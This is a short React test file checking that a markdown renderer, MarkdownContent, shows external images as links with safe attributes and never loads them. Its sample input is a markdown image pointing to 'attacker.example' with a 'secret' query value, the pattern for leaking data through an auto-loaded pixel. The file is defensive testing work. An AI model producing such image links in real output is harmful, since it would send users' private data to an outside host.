import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MarkdownContent } from "./MarkdownContent";

describe("MarkdownContent images", () => {
    it("does not load an external image, and links to it instead", () => {
        const src = "https://attacker.example/pixel.png?d=secret";
        const { container } = render(
            <MarkdownContent
                text={`![Chart](${src})`}
                inlineCitationTargets={[]}
                caseCitations={new Map()}
                caseDocuments={new Map()}
            />,
        );

        expect(container.querySelector("img")).toBeNull();
        const link = screen.getByRole("link", { name: "Chart" });
        expect(link).toHaveAttribute("href", src);
        expect(link).toHaveAttribute("rel", "noopener noreferrer");
    });
});
